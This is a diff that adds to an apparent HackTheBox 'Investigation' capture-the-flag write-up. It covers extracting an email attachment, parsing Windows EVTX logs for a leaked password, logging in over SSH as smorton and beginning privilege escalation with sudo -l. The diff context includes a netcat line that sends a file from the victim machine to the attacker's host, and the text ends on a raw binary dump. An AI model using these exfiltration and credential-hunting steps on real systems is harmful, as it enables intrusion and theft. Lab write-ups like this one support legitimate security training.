@@ -171,4 +171,139 @@ So, I used `netcat` to transfer the file from the victim machine to my machine.
 nc  10.10.14.8 10000 < Windows\ Event\ Logs\ for\ Analysis.msg 
 ```
 
-TBC
+Ideally, `OutLook` can be used to read the MSG file, but I didn't have such software on my Kali.
+
+Luckily, there is an [online converter](https://products.aspose.app/email/viewer/msg) that can help.
+
+And I saw an attachment in the email, so I might need another tool to extract the file.
+
+![image](https://user-images.githubusercontent.com/87711310/226175294-b2543068-232b-49cf-b56c-a2ed73ca5c3a.png)
+
+Now, that I needed to download the attachment with this file, I used another tool called [enncryptomatic](https://www.encryptomatic.com/viewer/): `extx-log.zip`
+
+![image](https://user-images.githubusercontent.com/87711310/226175361-c7fc2f50-7b7c-4418-ab87-61064e70d9b6.png)
+
+After inflating the file, I got an `EVTX` file, a Windows XML EventLog file. I googled a about tools that would enable me to analyse the `EVTX` file and stumbled upon this [one](https://github.com/williballenthin/python-evtx/blob/master/scripts/evtx_dump.py)
+
+```python
+#!/usr/bin/env python
+
+import Evtx.Evtx as evtx
+import Evtx.Views as e_views
+
+def main():
+    import argparse
+
+    parser = argparse.ArgumentParser(
+        description="Dump a binary EVTX file into XML.")
+    parser.add_argument("evtx", type=str,
+                        help="Path to the Windows EVTX event log file")
+    args = parser.parse_args()
+
+    with evtx.Evtx(args.evtx) as log:
+        print(e_views.XML_HEADER)
+        print("<Events>")
+        for record in log.records():
+            print(record.xml())
+        print("</Events>")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+Now, before running the file, I needed to install the `EVTX` module.
+
+```
+sudo pip install python-evtx
+```
+
+Then, running the tool I was able to  dump the log file into an XML human-readable file.
+
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Investigation]
+└─$ python evtx_dump.py security.evtx > extx.dump
+
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Investigation]
+└─$ file extx.dump 
+extx.dump: XML 1.1 document, ASCII text, with CRLF, LF line terminators
+```
+
+There are many tools and articles are out there to help analyse the event log file. but a quick glance through the document and I was able to find a  password from the dump file. I used the search bar and search for terms like `pass`, `pwd`, etc.
+
+![image](https://user-images.githubusercontent.com/87711310/226175873-118b761d-da92-4ebe-b421-73482635dd0e.png)
+
+I tried using this password to login as `smorton`, and I was in!!
+
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Investigation]
+└─$ ssh smorton@10.10.11.197               
+The authenticity of host '10.10.11.197 (10.10.11.197)' can't be established.
+ED25519 key fingerprint is SHA256:lYSJubnhYfFdsTiyPfAa+pgbuxOaSJGV8ItfpUK84Vw.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.11.197' (ED25519) to the list of known hosts.
+smorton@10.10.11.197's password: 
+Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-137-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sun 19 Mar 2023 12:43:51 PM UTC
+
+  System load:  0.0               Processes:             232
+  Usage of /:   59.5% of 3.97GB   Users logged in:       0
+  Memory usage: 8%                IPv4 address for eth0: 10.10.11.197
+  Swap usage:   0%
+
+
+0 updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+smorton@investigation:~$ whoami
+smorton
+smorton@investigation:~$ id
+uid=1000(smorton) gid=1000(smorton) groups=1000(smorton)
+
+```
+
+Grabbing the user flag.
+
+```
+smorton@investigation:~$ cat user.txt
+[REDACTED]
+```
+
+## Privilege Escalation
+I ran the `sudo -l` command to look at the files `smorton` was able to run as the root.
+
+```
+smorton@investigation:~$ sudo -l
+Matching Defaults entries for smorton on investigation:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User smorton may run the following commands on investigation:
+    (root) NOPASSWD: /usr/bin/binary
+```
+
+There was a binary file, so, I decided to take a look at it and as expeccted it was all gibberish. So, then, I decided to transfer the file to my machine and decompile it.
+
+```
+smorton@investigation:~$ cat /usr/bin/binary
+@@@@�▒▒▒H       H       %%   HH@-@=@=��P-P=P888 XXXDDS�td888 P�tdL L L 44Q�tdR�td@-@=@=��/lib64/ld-linux-x86-64.so.2GNU�GNU�W\\�K����O
+��
+  O���GNU��e�mZ{$ � ������@ �l����"libcurl-gnutls.so.4__gmon_start___ITM_deregisterTMCloneTable_ITM_registerTMCloneTablecurl_easy_cleanupcurl_easy_initcurl_easy_setoptcurl_easy_performlibc.so.6setuidexitfopenputsfclosemallocsystemgetuid__cxa_finalizestrcmp__libc_start_mainsnprintfGLIBC_2.2.5CURL_GNUTLS_3� u▒i
+                                                                                                                                                           #=
+ ▒@�@�?�?�?�?
+h?p?x?�?�?��?�? �?
+�?
+  �?�?�?�?�?��H�H��/H��t��H���52/��%3/��h���������h���������h���������h���������h���������h���������h���������h��q��������a������h      ��Q������h
+��A������h
+```
+
